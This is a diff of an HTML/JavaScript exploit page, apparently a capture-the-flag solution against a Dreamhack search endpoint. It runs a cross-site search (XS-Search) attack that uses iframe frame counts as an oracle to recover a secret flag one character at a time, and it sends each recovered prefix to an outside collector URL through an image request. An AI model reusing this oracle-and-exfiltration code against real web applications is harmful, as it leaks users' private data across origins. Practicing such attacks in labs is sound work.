@@ -1,61 +1,40 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <script>
-
-        const url = "http://host3.dreamhack.games:8695/search?query=";
-        const tools = "https://enqtlt6gx8jlc.x.pipedream.net/"
-
-        async function req(url) {
-            return new Promise(
-                (res, rej) => {
-                    const frame = document.getElementById("frame");
-                    frame.src = url;
-                    frame.onload = () => { 
-                        if (frame.contentWindow.frames.length != 0)
-                            return resolve();
-                        else
-                            return reject();
-                    };
-            })
-        }
-
-        async function call(query) {
-            try {
+<iframe id="iframe"></iframe>
+<img id="img">
+<script>
+    async function req(url) {
+        return await new Promise((resolve, reject) => {
+            const iframe = document.getElementById("iframe");
+            iframe.src = url;
+            iframe.onload = () => { 
+                if (iframe.contentWindow.frames.length != 0)
+                    return resolve();
+                else
+                    return reject();
+            };
+        });
+    }
+    async function search(query) {
+        try {
             await req(
-              url + query
+              `http://localhost:8000/search?query=${query}`
             );
             return true;
-            } catch (e) {
-                return false;
-            }
+        } catch (e) {
+            return false;
         }
-
-        async function exploit() {
-            let chars = "0123456789abcdef}"
-            let secret = "DH{";
-            while (!secret.includes("}")) {
-                    console.log("running");
-                    for (let c of chars) {
-                        console.log(secret);
-                        if (await call(secret + c)) {
-                            secret += c;
-                            img.src = tools + secret;
-                            break;
-                        }
-                    }
+    }
+    async function exploit() {
+        let chars = "0123456789abcdef}"
+        let secret = "DH{";
+        while (!secret.includes("}")) {
+            for (let c of chars) {
+                if (await search(secret + c)) {
+                    secret += c;
+                    img.src = `https://medzozd.request.dreamhack.games/${secret}`;
+                    break;
                 }
             }
-
-        exploit();
-    </script>
-</head>
-<body>
-    <img id="image">
-    <iframe id="frame"></iframe>
-</body>
-</html>
+        }
+    }
+    exploit();
+</script>
